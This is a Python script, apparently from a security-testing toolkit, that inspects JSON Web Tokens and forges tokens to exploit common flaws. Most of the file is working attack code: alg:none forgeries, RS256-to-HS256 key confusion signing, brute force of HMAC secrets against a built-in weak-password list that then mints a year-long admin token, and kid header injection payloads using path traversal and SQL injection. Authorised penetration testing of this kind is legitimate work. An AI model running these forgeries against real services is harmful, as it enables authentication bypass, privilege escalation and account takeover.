#!/usr/bin/env python3
"""JWT analysis and attack testing.

Tests for alg:none attack, key confusion (RS256->HS256), weak secret brute force,
expiry checks, claim validation, and kid injection.

Usage:
    python3 test-jwt.py '{"token": "eyJ...", "public_key": "...", "action": "analyze|alg_none|key_confusion|brute"}'
"""

import sys
import json
import base64
import hashlib
import hmac
import time
import struct
from datetime import datetime, timezone

# Try to import jwt library
try:
    import jwt as pyjwt
    HAS_PYJWT = True
except ImportError:
    HAS_PYJWT = False

# Common weak secrets for brute force
COMMON_SECRETS = [
    "secret", "password", "123456", "admin", "key", "private",
    "jwt_secret", "changeme", "test", "default", "mysecret",
    "supersecret", "letmein", "abc123", "qwerty", "password123",
    "s3cr3t", "jwt", "token", "auth", "api_key", "hmac_secret",
    "your-256-bit-secret", "your-secret-key", "my-secret-key",
    "jwt-secret", "app-secret", "HS256-secret", "secret123",
    "1234567890", "keyboard", "pass", "P@ssw0rd", "welcome",
    "", " ",
]


def b64url_decode(data):
    """Base64url decode with padding fix."""
    data = data.replace("-", "+").replace("_", "/")
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.b64decode(data)


def b64url_encode(data):
    """Base64url encode without padding."""
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode_jwt_parts(token):
    """Decode JWT header and payload without verification."""
    parts = token.split(".")
    if len(parts) != 3:
        return None, None, "Invalid JWT format: expected 3 parts"

    try:
        header = json.loads(b64url_decode(parts[0]))
    except Exception as e:
        return None, None, f"Failed to decode header: {str(e)}"

    try:
        payload = json.loads(b64url_decode(parts[1]))
    except Exception as e:
        return None, None, f"Failed to decode payload: {str(e)}"

    return header, payload, None


def analyze_token(token):
    """Full analysis of a JWT token."""
    header, payload, error = decode_jwt_parts(token)
    if error:
        return {"error": error}

    analysis = {
        "header": header,
        "payload": payload,
        "algorithm": header.get("alg", "unknown"),
        "type": header.get("typ", "unknown"),
        "key_id": header.get("kid"),
        "issues": [],
        "claims": {},
    }

    # Check algorithm
    alg = header.get("alg", "")
    if alg.lower() == "none":
        analysis["issues"].append({
            "severity": "critical",
            "issue": "Algorithm set to 'none' - signature not verified",
        })
    elif alg == "HS256":
        analysis["issues"].append({
            "severity": "info",
            "issue": "Uses symmetric HMAC algorithm (HS256) - vulnerable to brute force if weak secret",
        })

    # Check standard claims
    now = time.time()

    if "exp" in payload:
        exp = payload["exp"]
        analysis["claims"]["exp"] = {
            "value": exp,
            "human": datetime.fromtimestamp(exp, tz=timezone.utc).isoformat(),
            "expired": exp < now,
        }
        if exp < now:
            analysis["issues"].append({
                "severity": "info",
                "issue": f"Token is expired (exp: {datetime.fromtimestamp(exp, tz=timezone.utc).isoformat()})",
            })
    else:
        analysis["issues"].append({
            "severity": "medium",
            "issue": "No expiration claim (exp) - token never expires",
        })

    if "iat" in payload:
        iat = payload["iat"]
        analysis["claims"]["iat"] = {
            "value": iat,
            "human": datetime.fromtimestamp(iat, tz=timezone.utc).isoformat(),
        }

    if "nbf" in payload:
        nbf = payload["nbf"]
        analysis["claims"]["nbf"] = {
            "value": nbf,
            "human": datetime.fromtimestamp(nbf, tz=timezone.utc).isoformat(),
            "not_yet_valid": nbf > now,
        }

    if "iss" not in payload:
        analysis["issues"].append({
            "severity": "low",
            "issue": "No issuer claim (iss)",
        })
    else:
        analysis["claims"]["iss"] = payload["iss"]

    if "aud" not in payload:
        analysis["issues"].append({
            "severity": "low",
            "issue": "No audience claim (aud)",
        })
    else:
        analysis["claims"]["aud"] = payload["aud"]

    if "sub" in payload:
        analysis["claims"]["sub"] = payload["sub"]

    # Check for sensitive data in payload
    sensitive_keys = ["password", "passwd", "secret", "ssn", "credit_card", "cc", "cvv"]
    for key in payload:
        if key.lower() in sensitive_keys:
            analysis["issues"].append({
                "severity": "high",
                "issue": f"Potentially sensitive data in payload: '{key}'",
            })

    # Check kid for injection potential
    kid = header.get("kid")
    if kid:
        analysis["claims"]["kid"] = kid
        if any(c in str(kid) for c in ["'", '"', ";", "|", "/", ".."]):
            analysis["issues"].append({
                "severity": "high",
                "issue": f"Suspicious characters in kid header: {kid}",
            })

    return analysis


def test_alg_none(token):
    """Test alg:none attack - forge token without signature."""
    header, payload, error = decode_jwt_parts(token)
    if error:
        return {"error": error}

    # Create token with alg: none
    forged_tokens = []

    for alg_value in ["none", "None", "NONE", "nOnE"]:
        forged_header = dict(header)
        forged_header["alg"] = alg_value

        h = b64url_encode(json.dumps(forged_header))
        p = b64url_encode(json.dumps(payload))

        # Empty signature
        forged_tokens.append({
            "alg_value": alg_value,
            "token": f"{h}.{p}.",
            "note": "Empty signature",
        })
        # No signature part at all
        forged_tokens.append({
            "alg_value": alg_value,
            "token": f"{h}.{p}",
            "note": "Missing signature section",
        })

    return {
        "attack": "alg_none",
        "description": "Forged tokens with algorithm set to 'none' and empty/missing signature",
        "forged_tokens": forged_tokens,
        "test_instructions": "Submit each forged token to the target API. If accepted, the endpoint is vulnerable.",
    }


def test_key_confusion(token, public_key=None):
    """Test RS256->HS256 key confusion attack."""
    if not public_key:
        return {
            "attack": "key_confusion",
            "error": "Public key required for key confusion attack. Provide via 'public_key' parameter.",
        }

    header, payload, error = decode_jwt_parts(token)
    if error:
        return {"error": error}

    # Change algorithm from RS256 to HS256 and sign with the public key
    forged_header = dict(header)
    forged_header["alg"] = "HS256"

    h = b64url_encode(json.dumps(forged_header))
    p = b64url_encode(json.dumps(payload))
    signing_input = f"{h}.{p}".encode()

    # Sign using HMAC-SHA256 with the public key as the secret
    if isinstance(public_key, str):
        key_bytes = public_key.encode()
    else:
        key_bytes = public_key

    signature = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
    sig = b64url_encode(signature)

    return {
        "attack": "key_confusion",
        "description": "RS256 to HS256 algorithm confusion - signed with public key as HMAC secret",
        "original_algorithm": header.get("alg"),
        "forged_algorithm": "HS256",
        "forged_token": f"{h}.{p}.{sig}",
        "test_instructions": "Submit the forged token to the API. If accepted, the server is using the public key for HMAC verification.",
    }


def test_brute_force(token, custom_secrets=None):
    """Brute force HMAC secret."""
    header, payload, error = decode_jwt_parts(token)
    if error:
        return {"error": error}

    alg = header.get("alg", "")
    if alg not in ("HS256", "HS384", "HS512"):
        return {
            "attack": "brute_force",
            "error": f"Brute force only applies to HMAC algorithms. Token uses: {alg}",
        }

    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    target_sig = b64url_decode(parts[2])

    hash_func = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }[alg]

    secrets_to_try = list(COMMON_SECRETS)
    if custom_secrets:
        secrets_to_try.extend(custom_secrets)

    found_secret = None
    attempts = 0

    for secret in secrets_to_try:
        attempts += 1
        computed = hmac.new(secret.encode(), signing_input, hash_func).digest()
        if hmac.compare_digest(computed, target_sig):
            found_secret = secret
            break

    result = {
        "attack": "brute_force",
        "algorithm": alg,
        "attempts": attempts,
        "total_candidates": len(secrets_to_try),
    }

    if found_secret is not None:
        result["success"] = True
        result["secret"] = found_secret
        result["severity"] = "critical"
        result["note"] = f"JWT secret cracked: '{found_secret}'. Attacker can forge arbitrary tokens."

        # Generate a forged token as proof
        forged_payload = dict(payload)
        forged_payload["forged"] = True
        forged_payload["admin"] = True
        if "exp" in forged_payload:
            forged_payload["exp"] = int(time.time()) + 86400 * 365  # 1 year

        h = b64url_encode(json.dumps(header))
        p = b64url_encode(json.dumps(forged_payload))
        new_signing_input = f"{h}.{p}".encode()
        new_sig = hmac.new(found_secret.encode(), new_signing_input, hash_func).digest()
        result["forged_token"] = f"{h}.{p}.{b64url_encode(new_sig)}"
    else:
        result["success"] = False
        result["note"] = "Secret not found in wordlist. Token may use a strong secret."

    return result


def test_kid_injection(token):
    """Test kid header injection possibilities."""
    header, payload, error = decode_jwt_parts(token)
    if error:
        return {"error": error}

    kid = header.get("kid")

    injections = [
        {"kid": "../../dev/null", "technique": "path_traversal_null",
         "description": "Sign with empty string (dev/null content)"},
        {"kid": "/proc/sys/kernel/hostname", "technique": "path_traversal_file",
         "description": "Sign with hostname file content"},
        {"kid": "' UNION SELECT 'secret' -- ", "technique": "sql_injection",
         "description": "SQL injection to control signing key"},
        {"kid": "../../etc/hostname", "technique": "path_traversal_etc",
         "description": "Read system file as key"},
    ]

    forged_tokens = []
    for inj in injections:
        forged_header = dict(header)
        forged_header["kid"] = inj["kid"]
        forged_header["alg"] = "HS256"

        h = b64url_encode(json.dumps(forged_header))
        p = b64url_encode(json.dumps(payload))
        signing_input = f"{h}.{p}".encode()

        # For null/empty key attacks, sign with empty string
        key = b""
        if inj["technique"] == "sql_injection":
            key = b"secret"

        sig = hmac.new(key, signing_input, hashlib.sha256).digest()

        forged_tokens.append({
            "technique": inj["technique"],
            "description": inj["description"],
            "kid_value": inj["kid"],
            "token": f"{h}.{p}.{b64url_encode(sig)}",
        })

    return {
        "attack": "kid_injection",
        "original_kid": kid,
        "forged_tokens": forged_tokens,
        "test_instructions": "Submit each forged token. If any are accepted, the kid parameter is vulnerable to injection.",
    }


def main():
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Usage: test-jwt.py '{\"token\": \"...\", \"action\": \"analyze\"}' "}))
        sys.exit(1)

    try:
        args = json.loads(sys.argv[1])
    except json.JSONDecodeError as e:
        print(json.dumps({"error": f"Invalid JSON arguments: {str(e)}"}))
        sys.exit(1)

    token = args.get("token")
    if not token:
        print(json.dumps({"error": "Missing required parameter: token"}))
        sys.exit(1)

    action = args.get("action", "analyze")
    public_key = args.get("public_key")
    custom_secrets = args.get("secrets", [])

    results = {}

    if action == "analyze" or action == "all":
        results["analysis"] = analyze_token(token)

    if action == "alg_none" or action == "all":
        results["alg_none"] = test_alg_none(token)

    if action == "key_confusion" or action == "all":
        results["key_confusion"] = test_key_confusion(token, public_key)

    if action == "brute" or action == "brute_force" or action == "all":
        results["brute_force"] = test_brute_force(token, custom_secrets)

    if action == "kid_injection" or action == "all":
        results["kid_injection"] = test_kid_injection(token)

    # Summary
    all_issues = []
    if "analysis" in results and "issues" in results["analysis"]:
        all_issues = results["analysis"]["issues"]

    severity = "info"
    if results.get("brute_force", {}).get("success"):
        severity = "critical"
    elif any(i.get("severity") == "critical" for i in all_issues):
        severity = "critical"
    elif any(i.get("severity") == "high" for i in all_issues):
        severity = "high"
    elif any(i.get("severity") == "medium" for i in all_issues):
        severity = "medium"

    output = {
        "token_preview": token[:50] + "..." if len(token) > 50 else token,
        "action": action,
        "severity": severity,
        "results": results,
    }

    print(json.dumps(output, indent=2))


if __name__ == "__main__":
    main()
